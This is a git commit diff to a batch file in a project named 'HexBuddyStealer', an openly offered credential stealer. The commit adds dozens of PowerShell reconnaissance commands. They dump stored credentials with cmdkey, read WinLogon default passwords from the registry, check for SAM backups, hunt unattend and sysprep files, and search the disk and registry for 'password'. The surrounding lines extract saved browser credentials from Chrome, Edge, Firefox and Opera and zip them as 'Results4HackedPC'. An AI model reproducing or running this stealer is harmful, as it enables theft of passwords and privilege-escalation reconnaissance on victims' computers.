7d79c4b15f732521c0947ccad4bb22fd482d543d
Hex Buddy <82332026+HexBuddy@users.noreply.github.com>
2023-03-23 10:54:40 -0700

    Update file.bat

--- HexBuddyStealer/Bin/file.bat
+++ HexBuddyStealer/Bin/file.bat
@@ -13,14 +13,50 @@ powershell -EncodedCommand "KABuAGUAdABzAGgAIAB3AGwAYQBuACAAcwBoAG8AdwAgAHAAcgBv
 
 cd..
 
+
+
+powershell -c "Start-Process 'systeminfo' -NoNewWindow -Wait"
+powershell -c "Get-ChildItem Env: | ft Key,Value"
+powershell -c "Get-NetIPConfiguration | ft InterfaceAlias,InterfaceDescription,IPv4Address"
+powershell -c "Get-DnsClientServerAddress -AddressFamily IPv4 | ft"
+powershell -c "Get-NetNeighbor -AddressFamily IPv4 | ft ifIndex,IPAddress,LinkLayerAddress,State"
+powershell -c "Get-NetRoute -AddressFamily IPv4 | ft DestinationPrefix,NextHop,RouteMetric,ifIndex"
+powershell -c "Start-Process 'netstat' -ArgumentList '-ano' -NoNewWindow -Wait | ft"
+powershell -c "Get-PSDrive | where {$_.Provider -like 'Microsoft.PowerShell.Core\FileSystem'}| ft"
+powershell -c "Start-Process 'netsh' -ArgumentList 'firewall show config' -NoNewWindow -Wait | ft"
+powershell -c "Write-Host $env:UserDomain\$env:UserName"
+powershell -c "start-process 'whoami' -ArgumentList '/priv' -NoNewWindow -Wait | ft"
+powershell -c "Get-LocalUser | ft Name,Enabled,LastLogon"
+powershell -c "Start-Process 'qwinsta' -NoNewWindow -Wait | ft"
+powershell -c "start-process 'cmdkey' -ArgumentList "/list" -NoNewWindow -Wait | ft"
+powershell -c "Get-ItemProperty -Path 'Registry::HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\WinLogon' | select 'Default*' | ft"
+powershell -c "Get-LocalGroup | ft Name"
+powershell -c "Get-LocalGroupMember Administrators | ft Name, PrincipalSource"
+powershell -c "Get-ChildItem C:\Users | ft Name"
+powershell -c "Test-Path %SYSTEMROOT%\repair\SAM ; Test-Path %SYSTEMROOT%\system32\config\regback\SAM"
+powershell -c "gwmi -Query 'Select * from Win32_Process' | where {$_.Name -notlike 'svchost*'} | Select Name, Handle, @{Label='Owner';Expression={$_.GetOwner().User}} | ft -AutoSize"
+powershell -c "Get-ChildItem 'C:\Program Files', 'C:\Program Files (x86)' | ft Parent,Name,LastWriteTime"
+powershell -c "Get-ChildItem -path Registry::HKEY_LOCAL_MACHINE\SOFTWARE | ft Name"
+powershell -c "Get-ChildItem 'C:\Program Files\*', 'C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'Everyone'} } catch {}} | ft"
+powershell -c "Get-ChildItem 'C:\Program Files\*', 'C:\Program Files (x86)\*' | % { try { Get-Acl $_ -EA SilentlyContinue | Where {($_.Access|select -ExpandProperty IdentityReference) -match 'BUILTIN\Users'} } catch {}} | ft"
+powershell -c "Test-Path -Path 'Registry::HKEY_CURRENT_USER\SOFTWARE\Policies\Microsoft\Windows\Installer' | ft"
+powershell -c "Get-ScheduledTask | where {$_.TaskPath -notlike '\Microsoft*'} | ft TaskName,TaskPath,State"
+powershell -c "Get-ChildItem C:\Windows\Tasks | ft"
+powershell -c "Get-CimInstance Win32_StartupCommand | select Name, command, Location, User | fl"
+powershell -c "Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like '*.xml' -or $_.Name -like '*.txt' -or $_.Name -like '*.ini')}"
+powershell -c "Get-ChildItem c:\* -include *.xml,*.ini,*.txt,*.config -Recurse -ErrorAction SilentlyContinue | Where-Object {$_.PSPath -notlike '*C:\temp*' -and $_.PSParentPath -notlike '*Reference Assemblies*' -and $_.PSParentPath -notlike '*Windows Kits*'}| Select-String -Pattern 'password'"
+powershell -c "reg query HKLM /f password /t REG_SZ /s"
+powershell -c "reg query HKCU /f password /t REG_SZ /s"
+
+
+
 mkdir Hacked-Browsers-Credintionals
 cd Hacked-Browsers-Credintionals
 %~dp0hackbrowserdata.exe -b chrome -f json --results-dir Chrome
 %~dp0hackbrowserdata.exe -b edge -f json --results-dir Microsoft-Edge
 %~dp0hackbrowserdata.exe -b firefox -f json --results-dir FireFox
 %~dp0hackbrowserdata.exe -b opera -f json --results-dir Opera
-cd ..
 cd %USERPROFILE%
-powershell -c Compress-Archive "Results4HackedPC" "Results4HackedPC.zip"
+powershell -c "Compress-Archive Results4HackedPC Results4HackedPC.zip"
 @echo off
 pause
